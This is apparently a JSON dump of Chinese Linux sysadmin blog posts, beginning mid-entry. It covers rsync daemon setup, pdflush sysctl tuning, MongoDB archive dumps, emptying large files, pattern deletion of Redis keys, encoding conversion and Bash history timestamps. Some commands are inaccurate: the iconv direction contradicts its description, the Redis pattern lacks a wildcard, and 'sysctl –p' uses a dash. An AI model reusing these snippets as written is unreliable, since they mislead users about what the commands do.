no\nauth users = rsync\nsecrets file = /etc/rsync.passwd\n```\n\n　　上面这个命令行中-vzrtopg里的v是verbose，z是压缩，r是recursive，topg都是保持文件原有属性如属主、时间的参数（也可以用直接用a来代替rtopg， a为 --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD）。--progress是指显示出详细的进度情况，--delete是指如果服务器端删除了这一文件，那么客户端也相应把文件删除，保持真正的一致。\n\n　　（2）、上面的命令需要在备份的时候需要输入密码，可以在客户端建立一个密码文件，在命令中把密码文件作为参数带入：\n\n```sh\nvim /etc/rsync.passwd\n\nhyl\n```\n\n　　密码文件中不用输入用户名，只需输入密码即可。\n\n\n　　这份密码文件权限属性要设得只有root可读，不然会报错，修改属性：\n\n```sh\nchmod 600 /etc/rsync.passwd\n```\n\n　　用下面这条命令，可以不输入密码：\n\n```sh\n/usr/bin/rsync -vzrtopg --delete  --progress --password-file=/etc/rsync.passwd rsync@192.168.8.126::test /usr/local/share/rsync_backup \n```\n　　(3)、 带exclude 参数\n\n　　把服务器上的/home/hyj/workspace/test文件夹中的内容备份到客户端的/usr/local/share/rsync_backup中，但不包括:res目录和default.properties文件：\n\n```sh\n/usr/bin/rsync -vzrtopg --delete --exclude \"res/\" --exclude \"default.properties\" --progress --password-file=/etc/rsync.passwd rsync@192.168.8.126::test /usr/local/share/rsync_backup \n```\n\n** exclude/include规则实例 **\n\n```sh\nHere are some exclude/include examples:\n --exclude \"*.o\"   would exclude all filenames matching *.o\n --exclude \"/foo\"  would exclude a file in the base directory called foo\n --exclude \"foo/\"  would exclude any directory called foo.\n --exclude \"/foobar\" would exclude any file called bar two or more levels below a base directory called foo.\n --include \"*/\" --include \"*.c\" --exclude \"*\" would include all directories and C source files\n--include \"foo/\" --include \"foo/bar.c\" --exclude \"*\" would include only foo/bar.c\n (the foo/ directory must be explicitly included or it would be excluded by the \"*\")\n\n```\n　　(4)、 把客户端上的/home/hyj/vitest文件夹中的内容备份到服务器的/usr/local/share/rsync_backup中，在客户端执行如下命令:\n\n```sh\n   /usr/bin/rsync -vzrtopg --delete --progress --password-file=/etc/rsync.passwd /home/hyj/vitest rsync@192.168.8.126::clientdata\n```\n\n　　此时服务器的配置文件/etc/rsyncd.conf内容为:\n\n```sh\nuid = root\ngid = root\nhosts allow = 192.168.8.122, 192.168.8.123\n#hosts deny = 0.0.0.0/32\nuse chroot = no\nmax connections = 10\npid file = /var/run/rsyncd.pid\nlock file = /var/run/rsync.lock\nlog file = /var/log/rsyncd.log\ntimeout=600\n\n[test]\npath = /home/hyj/workspace/test\ncomment = rsync files\nignore errors\nread only = yes\nlist = no\nauth users = rsync\nsecrets file = /etc/rsync.passwd\n\n # 上面的命令中，客户端的数据备份到clientdata模块中，备份到/usr/local/share/rsync_backup文件夹下，read only改为no，# # 否则会报 `ERROR: module is read only` 的错误\n\n[clientdata]\npath = /usr/local/share/rsync_backup\ncomment = rsync files\nignore errors\nread only = no\nlist = no\nauth users = rsync\nsecrets file = /etc/rsync.passwd\n```\n\n\n# FAQ\n\n### 1、我需要在防火墙上开放哪些端口以适应rsync？\n\n　　视情况而定\n\n　　rsync可以直接通过873端口的tcp连接传文件，也可以通过22端口的ssh来进行文件传递，但你也可以通过下列命令改变它的端口：\n\n```sh\nrsync --port 8730 otherhost::\n或者\nrsync -e 'ssh -p 2002' otherhost:\n```\n\n### 2、 我如何通过rsync只复制目录结构，忽略掉文件呢？\n\n```sh\nrsync -av --include '*/' --exclude '*' source-dir dest-dir\n```\n\n# 常见错误\n\n```sh\nrsync: failed to connect to 218.107.243.2: No route to host (113) \nrsync error: error in socket IO (code 10) at clientserver.c(104) [receiver=2.6.9]\n```\n　　解决：对方没开机、防火墙阻挡、通过的网络上有防火墙阻挡，都有可能。关闭防火墙，其实就是把tcp udp 的873端口打开：\n\n---\n\n```sh\npassword file must not be other-accessible \ncontinuing without password file \nPassword: \n```\n\n　　解决：这是因为rsyncd.pwd rsyncd.sec的权限不对，应该设置为600。如：`chmod 600 rsyncd.pwd`\n\n---\n\n```sh\n@ERROR: auth failed on module xxxxx \nrsync: connection unexpectedly closed (90 bytes read so far) \nrsync error: error in rsync protocol data stream (code 12) at io.c(150) \n```\n\n　　解决：这是因为密码设置错了，无法登入成功，检查一下rsync.pwd，看客服是否匹配。还有服务器端没启动rsync 服务也会出现这种情况。 \n\n---\n\n```sh\n@ERROR: chroot failed \nrsync: connection unexpectedly closed (75 bytes read so far) \nrsync error: error in rsync protocol data stream (code 12) at io.c(150) \n```\n\n　　解决：这是因为你在 rsync.conf 中设置的 path 路径不存在，要新建目录才能开启同步。 \n\n---\n\n```sh\n[root@hyj rsync_backup]# /usr/bin/rsync -vzrtopg --delete --exclude \"res/\" --exclude \"default.properties\" --progress rsync@192.168.8.126::test /usr/local/share/rsync_backup --password-file=/etc/rsync.pass\n\n@ERROR: chdir failed\n\nrsync error: error starting client-server protocol (code 5) at main.c(1516) [Receiver=3.0.9]\n```\n\n　　原因及解决办法：SELinux；（下面这条命令在服务器端执行）\n```sh\nsetsebool -P rsync_disable_trans on\n```\n\n---\n\n```sh\nERROR: module is read only\nrsync: read error: Software caused connection abort (113)\nrsync error: error in rsync protocol data stream (code 12) at io.c(769) [sender=3.0.8]\n```\n\n　　解决：这是因为服务器端配置文件rsyncd.conf中read only = yes，为只读，即不允许客户端上传文件，改成no就可以了。\n","tags":["rsync"],"categories":["service"]},{"title":"pdflush进程详解与优化","url":"/2017/05/25/system/pdflush进程详解与优化/","content":"# 一、简介\n\n　　由于页高速缓存的缓存作用，写操作实际上会被延迟。当页高速缓存中的数据比后台存储的数据更新时，那么该数据就被称做脏数据。在内存中累积起来的脏页最终必须被写回磁盘。\n\n<!-- more -->\n\n在以下两种情况发生时，脏页被写回磁盘：\n\n* 当空闲内存低于一个特定的阈值时，内核必须将脏页写回磁盘，以便释放内存。\n* 当脏页在内存中驻留时间超过一个特定的阈值时，内核必须将超时的脏页写回磁盘，以确保脏页不会无限期地驻留在内存中。\n\n　　上面两种工作的目的完全不同。实际上，在老内核中，这是由两个独立的内核线程分别完成的。但是在2.6内核中，由一群内核线程—pdflush后台回写例程—统一执行两种工作。\n\n　　我们来看看这两个目标是如何具体实现的。首先，当系统中的空闲内存低于一个特定的阈值时，pdflush线程将脏页刷新回磁盘。该后台回写例程的目的在于在可用物理内存过低时，释放脏页以重新获得内存。特定的内存阈值可以通过`dirty_background_ratio`参数设置。当空闲内存比阈值`dirty_ background_ratio`还低时，内核便会调用函数`wakeup_bdflush()`唤醒一个pdflush线程，随后pdflush线程进一步调用函数`background_writeout()`开始将脏页写回磁盘。函数`background_ writeout()`需要一个长整型参数，该参数指定试图回写的页面数目。\n\n　　函数`background_writeout()`会连续地写出数据，直到满足以下两个条件：\n\n* 已经有指定的最小数目的页被写出到磁盘。\n* 空闲内存数已经回升，超过了阈值dirty_background_ratio。\n\n　　上述条件确保了pdflush操作可以减轻系统中内存不足的压力。回写操作不会在达到这两个条件前停止，除非pdflush写回了所有的脏页，没有剩下的脏页可再被写回了。\n\n　　要满足第二个目标，pdflush后台例程会被周期性唤醒（和空闲内存是否过低无关），将那些在内存中驻留时间过长的脏页写出，确保内存中不会有长期存在的脏页。假如系统发生崩溃，则内存会处于混乱之中，而那些在内存中还没来得及写回磁盘的脏页就会丢失，所以周期性同步回写非常重要。\n\n　　在系统启动时，内核初始化一个定时器，让它周期地唤醒pdflush线程，随后使其运行函数`wb_kupdate()`。该函数将把所有驻留时间超过百分之`dirty_expire_centisecs`秒的脏页写回。然后定时器将再次被初始化为百分之`dirty_expire_ centisecs`秒后唤醒pdflush线程。\n\n　　总而言之，pdflush线程周期地被唤醒并且把超过特定期限的脏页写回磁盘。\n\n# 二、proc下的相关控制参数\n\n　　系统管理员可以在/proc/sys/vm中设置回写相关的参数，也可以通过sysctl系统调用设置它们。\n\n* /proc/sys/vm/dirty_ratio\n\n　　这个参数控制一个进程在文件系统中的文件系统写缓冲区的大小，单位是百分比，表示系统内存的百分比，表示当一个进程中写缓冲使用到系统内存多少的时候，再有磁盘写操作时开始向磁盘写出数据。增大之会使用更多系统内存用于磁盘写缓冲，也可以极大提高系统的写性能。但是，当你需要持续、恒定的写入场合时，应该降低其数值.一般缺省是 40。设置方法如下：\n\n```sh\necho 30 >/proc/sys/vm/dirty_ratio\n```\n\n---\n\n* /proc/sys/vm/dirty_background_ratio\n\n　　这个参数控制文件系统的pdflush进程，在何时刷新磁盘。单位是百分比，表示系统总内存的百分比，意思是当磁盘的脏数据缓冲到系统内存多少的时候，pdflush开始把脏数据刷新到磁盘。增大会使用更多系统内存用于磁盘写缓冲，也可以极大提高系统的写性能。但是，当你需要持续、恒定的写入场合时，应该降低其数值.一般缺省是10。设置方法如下：\n\n```sh\necho 8 >/proc/sys/vm/dirty_background_ratio\n```\n\n---\n\n* /proc/sys/vm/dirty_writeback_centisecs\n\n　　Pdflush写后台进程每隔多久被唤醒并执行把脏数据写出到硬盘。单位是 1/100 秒。如果你的系统是持续地写入动作，那么实际上还是降低这个数值比较好，这样可以把尖峰的写操作削平成多次写操作。缺省数值是500，也就是 5 秒。设置方法如下：\n\n```sh\necho 200 >/proc/sys/vm/dirty_writeback_centisecs\n```\n\n---\n\n* /proc/sys/vm/dirty_expire_centisecs\n\n　　这个参数声明Linux内核写缓冲区里面的脏数据多“旧”了之后，pdflush 进程就开始考虑写到磁盘中去。单位是 1/100秒。对于特别重载的写操作来说，这个值适当缩小也是好的，但也不能缩小太多，因为缩小太多也会导致IO提高太快。缺省是 30000，也就是 30 秒的数据就算旧了，将会刷新磁盘。建议设置为 1500，也就是15秒算旧。设置方法如下：\n\n```sh\necho 1500 >/proc/sys/vm/dirty_expire_centisecs\n```\n\n---\n\n# 三、内核参数修改后的生效\n\n　　Linux在系统运行时修改内核参数(/proc/sys与/etc/sysctl.conf)，而不需要重新引导系统，这个功能是通过/proc虚拟文件系统实现的。\n\n　　在/proc/sys目录下存放着大多数的内核参数，并且设计成可以在系统运行的同时进行更改,可以通过更改/proc/sys中内核参数对应的文件达到修改内核参数的目的(修改过后，保存配置文件就马上自动生效)，不过重新启动机器后之前修改的参数值会失效，所以只能是一种临时参数变更方案。(适合调试内核参数优化值的时候使用，如果设置值有问题，重启服务器还原原来的设置参数值了。简单方便。)\n\n　　但是如果调试内核参数优化值结束后，需要永久保存参数值，就要通过修改/etc/sysctl.conf内的内核参数来永久保存更改。但只是修改sysctl文件内的参数值，确认保存修改文件后，设定的参数值并不会马上生效，如果想使参数值修改马上生效，并且不重启服务器，可以执行下面的命令：\n\n```sh\nsysctl –p\n```\n\n---\n\n　　下面介绍一下/proc/sys下内核文件与配置文件sysctl.conf中变量的对应关系：\n\n　　由于可以修改的内核参数都在/proc/sys目录下，所以sysctl.conf的变量名省略了目录的前面部分（/proc/sys）。即将/proc/sys中的文件转换成sysctl中的变量依据下面两个简单的规则：\n\n1. 去掉前面部分/proc/sys\n2. 将文件名中的斜杠变为点\n\n　　这两条规则可以将/proc/sys中的任一文件名转换成sysctl中的变量名。\n\n　　例如：\n\n```sh\n/proc/sys/net/ipv4/ip_forward => net.ipv4.ip_forward\n/proc/sys/kernel/hostname =>  kernel.hostname\n```\n\n　　可以使用下面命令查询所有可修改的变量名\n\n```sh\nsysctl –a\n```\n","tags":["调优"],"categories":["system"]},{"title":"MongoDB归档及压缩工具","url":"/2017/05/25/database/MongoDB归档及压缩工具/","content":"　　原文地址：http://t.dbdao.com/archives/archiving-and-compression-in-mongodb-tools.html\n\n\n# 介绍\n\n　　我在MongoDB World 2015做的演讲“Putting the Go in MongoDB”，重点是关于MongoDB工具的重写，从C ++到Go，这在可用性以及性能方面得到了一些改进，但是这里我只简要的说两个方面的新功能，(planned for the 3.2 release) – 归档和压缩。\n\n　　在本文中，我将对mongodump和mongorestore提供更详细的归档和压缩特性说明，并探索使用这些特性的可行用例。\n\n\n<!-- more -->\n\n# 概述\n\n　　一个通常目的的归档一般由一个或多个文件组成。这样例子如磁带归档格式(tar)，其中包含按顺序组成的一个或多个文件。归档在执行进程间通信的应用程序中尤其有用，例如，你可以通过远程服务器进行目录的tarball压缩，然后通过SSH，传送到到本机上进行解压：\n\n```ssh\nssh source.server.com tar c sourceDirectory | tar x\n```\n\n　　由于归档以顺序的方式创建，接收端将能按顺序接收到发送端按顺序发来的数据。\n\n　　在3.0中，我们增加了在MongoDB中并发执行备份和恢复多个集合的能力，这可以让你执行备份时，更加充分地利用磁盘I / O。 结果，写入mongodump的备份并不一定以顺序的方式接收。 同样，mongorestore同时读取还原操作集合，它的读取指令也并非是序列性的。\n\n　　通用归档格式，如tar，只支持连续的文件归档打包。mongodump和mongorestore利用这些备份格式，将得到一个不可接受的性能退化， 由于所有集合的数据将不得不被按顺序写入和读出。为了支持这些工具的并发行为，我们研发了一个特殊的通用备份格式，支持非并发文件的写入。 这个新的归档特性极大了提高了备份和还原操作的效率。\n\n# 背景\n\n　　为了按上下文情况进行备份，我们考虑一下你们通常是如何创建备份的。比如，假设你有一个“country”的数据库，其中含有两个集合： “nigeria” and “austria”， 你可能会这样操作：\n\n```sh\t\nmongodump --db country\n```\n\n　　上面的指令读取“country”数据库的所有集合， 然后将其写入“dump”目录。 上面的指令就会产生以下的目录列表：\n\n```sh\ndump/\n└── [4.3M]  country\n    ├── [2.1M]  austria.bson\n    ├── [  87]  austria.metadata.json\n    ├── [2.1M]  nigeria.bson\n    ├── [  87]  nigeria.metadata.json\n    └── [ 140]  system.indexes.bson\n \n1 directory, 5 files\n```\n\n　　你也可以备份整个服务器-这里的服务器包含两个数据库(country 和product)。\n\n```sh\nmongodump\n```\n\n```sh\n├── [5.4M]  dump\n│   ├── [4.03M]  country\n│   │   ├── [2.1M]  austria.bson\n│   │   ├── [  87]  austria.metadata.json\n│   │   ├── [2.1M]  nigeria.bson\n│   │   ├── [  87]  nigeria.metadata.json\n│   │   └── [ 140]  system.indexes.bson\n│   └── [1.1M]  product\n│       ├── [1.0M]  mongodump.bson\n│       ├── [  89]  mongodump.metadata.json\n│       └── [  72]  system.indexes.bson\n2 directories, 8 files\n```\n\n　　或选择备份单个集合到标准输出，而不是一个目录：\n\n```sh\t\nmongodump --db country --collection nigeria --out -\n```\n\n# 归档支持\n\n　　在3.2中，我们引入了创建备份的一个附加模式 －－ “归档”模式，写入所有转储数据，甚至从不同的数据库和集合到单一的输出文件。 使用mongodump创建归档是极为简单的 – 只需要一个附加选项：\n\n```sh\nmongodump --db country --archive=country.archive\n\t\n-rw-rw-r-- 1 wisdom wisdom 4.2M Jun 29 11:12 country.archive\n```\n\n　　上面的指令将在“country.archive”文件中创建“country”的数据库归档。默认情况下，归档被写入到标准输出。不同于目录模式的执行备份，创建目录树，默认归档模式下备份结果就是一个单一的文件， 包含“country”数据库的所有数据-所有集合，索引等。\n\n　　你也可以备份一个单一的集合或整个服务器的内容：\n\n　　**单一集合：**\n\n```sh\t\nmongodump --db country --collection nigeria --archive=nga.archive\n\t\n-rw-rw-r-- 1 wisdom wisdom 2.1M Jun 29 11:15 nga.archive\n```\n\n　　**整个服务器：**\n\n```sh\nmongodump --archive=server.archive\n\t\n-rw-rw-r-- 1 wisdom wisdom 5.3M Jun 29 11:26 server.archive\n```\n\n　　在mongodump的这种情况下，归档模式允许多个集合以非连续的方式打包在归档文件内。在mongorestore中，它允许多个集合进行并行恢复。这样，你可以在网络上执行数据迁移，降低磁盘I/O所占空间，享受到充分利用工具和底层存储引擎的并发所带来的好处。\n\n# 数据迁移\n\n　　一个新的备份改善的例子， 是mongodump和mongorestore之间的进程间通信 – 特别是能够将数据从一个传到另一个。在以前的版本中，这种支持有限 – 一个时间只能传输一个集合。现在，使用归档就没有这样的限制。这种方式对于数据库服务器出于安全考虑而安装有防火墙的情况下很有用。在这种情况下，一个通常的设计是允许一个或多个服务器方访问数据库。使用归档功能，在SSH上进行数据转移数据，就轻而易举了：\n\n```sh\nssh wisdom@proxy.server.com mongodump --host source.server.com --archive  | ssh wisdom@target.server.com mongorestore --archive\n```\n\n　　上面的指令使用SSH方式连接到代理主机（proxy.server.com），访问源服务器（source.server.com），在代理服务器上运行mongodump，为了最终的恢复，将源服务器的发送内容（通过SSH）到目标服务器（target.server.com）。\n\n　　如果没有归档，通过mongodump完成这些操作的唯一办法就是，先执行备份到磁盘，在将文件复制到目标服务器，然后运行mongorestore。通过备份，一个指令就可以完成- 无需任何附加磁盘I/O的开销。\n\n# 压缩支持\n\n　　除了备份，我们还使用gzip进行压缩。这是通过在mongodump和mongorestore中引入一个新的指令行选项 “--gzip” 实现的。 压缩可用于目录以及归档模型下创建的备份，压缩还可以减少磁盘空间使用。\n\n```sh\nmongodump --db country --gzip\n```\n\n　　生成：\n\n```sh\ndump/\n└── [568K]  country\n    ├── [254K]  austria.bson.gz\n    ├── [ 100]  austria.metadata.json.gz\n    ├── [254K]  nigeria.bson.gz\n    ├── [ 100]  nigeria.metadata.json.gz\n    └── [  91]  system.indexes.bson.gz\n \n1 directory, 5 files\n```\n\n　　注意,目录模型的归档备份大小-568KB-比没有压缩的备份要小很多-4.3MB.\n\n　　**压缩归档：**\n\n```sh\nmongodump --db country --gzip --archive=country.archive\n\n-rw-rw-r-- 1 wisdom wisdom 509K Jun 29 11:23 country.archive\n```\n\n　　对于归档来说，数据在写入归档之前需要先压缩。\n\n　　恢复压缩目录模式备份，你应该运行：\n\n```sh\t\nmongorestore --gzip\n```\n\n　　类似用来恢复归档模式下的压缩备份的命令：\n\n```sh\t\nssh wisdom@proxy.server.com mongodump --host source.server.com --archive --gzip  | ssh wisdom@target.server.com mongorestore --archive --gzip\n```\n\n　　数据迁移不会产生任何磁盘I / O开销，由于压缩，将会使用更少的网络带宽。\n\n# 总结\n\n　　归档和压缩特性产生了许多用于进行备份和恢复操作的例子。如果你们正在使用MongoDB工具和其它类型的应用程序，我们也乐于倾听你们的经验及用例。 尽管目前最新版本工具还不文档，不过希望大家先对这些特性体验起来。\n\n　　**注：** 作为提供共享集群的集群范围快照的唯一备份解决方案，MongoDB Ops Manager和MongoDB Cloud Mannager被推荐用于较大的MongoDB部署。\n","tags":["mongodb"],"categories":["database"]},{"title":"Linux下清空或删除大文件内容的5种方法","url":"/2017/05/25/system/Linux下清空或删除大文件内容的5种方法/","content":"\n\n编译自：http://www.tecmint.com/empty-delete-file-content-linux/ 作者： Aaron Kili\n\n原创：LCTT https://linux.cn/article-8024-1.html 译者： FSSlc \n\n在 Linux 终端下处理文件时，有时我们想直接清空文件的内容但又不必使用任何 Linux 命令行编辑器 去打开这些文件。那怎样才能达到这个目的呢？在这篇文章中，我们将介绍几种借助一些实用的命令来清空文件内容的方法。\n\n**注意：** 在我们进一步深入了解这些方法之前，请记住: 由于在 Linux 中一切皆文件，你需要时刻注意，确保你将要清空的文件不是重要的用户文件或者系统文件。清空重要的系统文件或者配置文件可能会引发严重的应用失败或者系统错误。\n\n前面已经说道，下面的这些方法都是从命令行中达到清空文件的目的。\n\n**提示：** 在下面的示例中，我们将使用名为 access.log 的文件来作为示例样本。\n<!-- more -->\n\n# 1. 通过重定向到 Null 来清空文件内容\n\n清空或者让一个文件成为空白的最简单方式，是像下面那样，通过 shell 重定向 `null` （不存在的事物）到该文件：\n\n```sh\n> access.log\n```\n\n```sh\n[root@localhost logs]# du -sh catalina.out \n9.7G\tcatalina.out\n[root@localhost logs]# > catalina.out \n[root@localhost logs]# du -sh catalina.out \n0\tcatalina.out\n```\n\n在 Linux 下使用 Null 重定向来清空大文件\n\n# 2. 使用 `true` 命令重定向来清空文件\n\n下面我们将使用 : 符号，它是 shell 的一个内置命令，等同于 true 命令，它可被用来作为一个 no-op（即不进行任何操作）。\n\n另一种清空文件的方法是将 : 或者 true 内置命令的输出重定向到文件中，具体如下：\n\n```sh\n: > access.log\n```\n 或\n```sh\ntrue > access.log\n```\n\n使用 Linux 命令清空大文件\n\n# 3. 使用 cat/cp/dd 实用工具及 /dev/null 设备来清空文件\n\n在 Linux 中， null 设备基本上被用来丢弃某个进程不再需要的输出流，或者作为某个输入流的空白文件，这些通常可以利用重定向机制来达到。\n\n所以 /dev/null 设备文件是一个特殊的文件，它将清空送到它这里来的所有输入，而它的输出则可被视为一个空文件。\n\n另外，你可以通过使用 cat 命令 显示 /dev/null 的内容然后重定向输出到某个文件，以此来达到清空该文件的目的。\n\n```sh\ncat /dev/null > access.log\n```\n\n使用 cat 命令来清空文件\n\n下面，我们将使用 cp 命令 复制 /dev/null 的内容到某个文件来达到清空该文件的目的，具体如下所示：\n\n```sh\ncp /dev/null access.log\n```\n\n\n使用 cp 命令来清空文件\n\n而下面的命令中， if 代表输入文件，of 代表输出文件。\n\n```sh\ndd if=/dev/null of=access.log\n```\n\n\n使用 dd 命令来清空文件内容\n\n# 4. 使用 echo 命令清空文件\n\n在这里，你可以使用 echo 命令 将空字符串的内容重定向到文件中，具体如下：\n\n```sh\necho \"\" > access.log\n```\n或者\n ```sh\n echo > access.log\n```\n\n使用 echo 命令来清空文件\n\n**注意：**你应该记住空字符串并不等同于 null 。字符串表明它是一个具体的事物，只不过它的内容可能是空的，但 null 则意味着某个事物并不存在。\n\n基于这个原因，当你将 echo 命令 的输出作为输入重定向到文件后，使用 cat 命令 来查看该文件的内容时，你将看到一个空白行（即一个空字符串）。\n\n要将 null 做为输出输入到文件中，你应该使用 -n 选项，这个选项将告诉 echo 不再像上面的那个命令那样输出结尾的那个新行。\n\n```sh\necho -n \"\" > access.log\n```\n\n使用 Null 重定向来清空文件\n\n# 5. 使用 truncate 命令来清空文件内容\n\ntruncate 可被用来将一个文件缩小或者扩展到某个给定的大小。\n\n你可以利用它和 -s 参数来特别指定文件的大小。要清空文件的内容，则在下面的命令中将文件的大小设定为 0:\n\n```sh\ntruncate -s 0 access.log\n```\n\n在 Linux 中截断文件内容\n\n我要介绍的就是这么多了。在本文中，我们介绍了几种通过使用一些简单的命令行工具和 shell 重定向机制来清除或清空文件内容的方法。\n\n上面介绍的这些可能并不是达到清空文件内容这个目的的所有可行的实践方法，所以你也可以通过下面的评论栏告诉我们本文中尚未提及的其他方法。\n\n\n---\n\nvia: http://www.tecmint.com/empty-delete-file-content-linux/\n\n作者：Aaron Kili 译者：FSSlc 校对：jasminepeng\n\n本文由 LCTT 原创编译，Linux中国 荣誉推出\n","tags":["bash"],"categories":["system"]},{"title":"redis模糊删除key","url":"/2017/05/25/database/redis模糊删除key/","content":"\nRedis keys命令支持模式匹配，但是del命令不支持模式匹配，有时候需要根据一定的模式来模糊删除key，这时只能结合shell命令来完成了。 具体命令是：\n\n<!-- more -->\n\n```sh\nredis-cli KEYS \"pattern\" | xargs redis-cli DEL\n```\n\n其中pattern是keys命令支持的模式，这样就可以模糊删除key了。服务器上测试删除150万条数据的效率也是很高的。\n\n所有的Redis命令可以在这里找到：http://redis.io/commands\n\nKEYS命令：http://redis.io/commands/keys\n\nDEL命令: http://redis.io/commands/del\n\n**my demo:**\n\nprefix_: 需要删除key的匹配的前缀名\n```sh\nredis-cli KEYS \"prefix_\" | xargs redis-cli DEL \n```\n\n删除端口为27001 ,库为4号库里的数据:\n\n```sh\nredis-cli -p 27001 -n 4  KEYS \"prefix_\" |  xargs redis-cli -p 27001 -n 4 del\n\n```\n","tags":["redis"],"categories":["database"]},{"title":"Linux查看文件编码格式及文件编码转换","url":"/2017/05/25/system/Linux查看文件编码格式及文件编码转换/","content":"\n如果你需要在Linux 中操作windows下的文件，那么你可能会经常遇到文件编码转换的问题。Windows中默认的文件格式是GBK(gb2312)，而Linux一般都是UTF-8。下面介绍一下，在Linux中如何查看文件的编码及如何进行对文件进行编码转换。\n\n<!-- more -->\n\n# 查看文件编码\n\n在Linux中查看文件编码可以通过以下几种方式：\n\n### 1.在Vim 中可以直接查看文件编码\n\n```sh\n    :set fileencoding  \n```\n\n即可显示文件编码格式。\n\n如果你只是想查看其它编码格式的文件或者想解决用Vim查看文件乱码的问题，那么你可以在 `~/.vimrc` 文件中添加以下内容：\n\n```sh\n    set encoding=utf-8 fileencodings=ucs-bom,utf-8,cp936\n```\n\n这样，就可以让vim自动识别文件编码（可以自动识别UTF-8或者GBK编码的文件），其实就是依照 fileencodings提供的编码列表尝试，如果没有找到合适的编码，就用latin-1(ASCII)编码打开。\n\n### 2. enca (如果你的系统中没有安装这个命令，可以用sudo yum install -y enca 安装 )查看文件编码\n\n```sh\n$ enca filename\nfilename: Universal transformation format 8 bits; UTF-8\nCRLF line terminators\n```\n\n需要说明一点的是，enca对某些GBK编码的文件识别的不是很好，识别时会出现：\n\n```\nUnrecognized encoding\n```\n\n# 文件编码转换\n\n### 1.在Vim中直接进行转换文件编码,比如将一个文件转换成utf-8格式\n\n```sh\n    :set fileencoding=utf-8  \n```\n\n### 2. enconv 转换文件编码，比如要将一个GBK编码的文件转换成UTF-8编码，操作如下\n\n```sh\nenconv -L zh_CN -x UTF-8 filename\n```\n\n### 3. iconv 转换，iconv的命令格式如下：\n\n```sh\niconv -f encoding -t encoding inputfile\n```\n\n比如将一个UTF-8 编码的文件转换成GBK编码\n\n```sh\niconv -f GBK -t UTF-8 file1 -o file2\n```\n","tags":["字符集"],"categories":["system"]},{"title":"Bash历史中执行过的每一项命令设置时间和日期.md","url":"/2017/05/25/system/Bash历史中执行过的每一项命令设置时间和日期/","content":"\n在默认情况下，所有通过 Bash 在命令行中执行过的命令都被存储在历史缓存区或者一个叫做 ` ~/.bash_history` 的文件里。这意味着系统管理员可以看到系统上用户执行过的命令清单，或者用户可以通过像 `history` 命令这样的选项来看他或她自己的命令历史。\n<!-- more -->\n\n```sh\n[root@l-webdb-docker-dev ~]# history \n    1  vim /gotwo_data/scripts/cronjob/sync_mysql_online.sh\n    2  exit\n    3  ps -ef | grep 4004\n    4  exit\n    5  mysql\n    6  mysqldump -uroot -p db_ad > /tmp/db_ad.sql\n    7  vim /tmp/db_ad.sql \n    8  mysqldump -uroot -p db_ad > /tmp/db_ad.sql\n```\n\n从上面` history `命令的输出可知，命令被执行的日期和时间并没有显示出来。基本上所有的 Linux 发行版的默认设置都是这样的。\n\n在这篇文章里，我们将解释当在 Bash 中执行` history `命令显示每个命令时，如何配置显示时间戳信息。\n\n每个命令相关的日期和时间可以记录到历史文件中，用 `HISTTIMEFORMAT` 环境变量的设置作为命令历史的备注记录。\n\n这里有两种可行的方式来达到目的：一种是暂时的效果，一种是永久的效果。\n\n要临时设置 `HISTTIMEFORMAT `环境变量，在命令行这样输出它：\n```sh\n $ export HISTTIMEFORMAT='%F %T '\n```\n\n在上面的输出命令当中，时间戳格式如下：\n\n1. `％F`－展开为完整日期，即` ％Y-％m-％d`（年-月-日）。\n\n2. `％T`－展开为时间，即` ％H:％M:％S`（时:分:秒）。\n\n通读 date 命令的 man 手册来获得更多使用说明：\n\n```sh\nman date\n```\n\n（LCTT 译注：注意：这个功能只能用在当 HISTTIMEFORMAT 这个环境变量被设置之后，之后的那些新执行的 bash 命令才会被打上正确的时间戳。在此之前的所有命令，都将会显示成设置 HISTTIMEFORMAT 变量的时间。）\n\n然而，如果你想永久地配置该变量，用你最喜欢的编辑器打开文件 ` ~/.bashrc`\n\n```sh\n    $ vi ~/.bashrc\n```\n    \n然后在下方添加（用注释将其标记为你自己的配置）：\n  \n```sh\n# 我的配置\nexport HISTTIMEFORMAT='%F %T '\n```\n\n保存文件并退出，然后，运行下面的命令以便改动当即生效：\n\n```sh\nsource ~/.bashrc\n```\n","tags":["bash"],"categories":["system"]}]